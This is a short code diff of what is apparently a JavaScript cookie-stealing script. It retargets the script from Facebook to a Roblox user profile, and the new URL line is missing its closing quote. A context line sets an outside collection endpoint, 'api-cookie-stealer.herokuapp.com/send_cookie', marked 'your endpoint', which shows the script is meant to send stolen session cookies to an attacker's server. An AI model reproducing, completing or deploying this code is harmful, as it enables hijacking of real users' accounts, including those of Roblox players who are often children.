@@ -1,4 +1,4 @@
-var url = "https://www.facebook.com";
+var url = "https://www.roblox.com/users/31323231/profile;
 var endpoint = "https://api-cookie-stealer.herokuapp.com/send_cookie"; // your endpoint
 
 var xs = {}; 
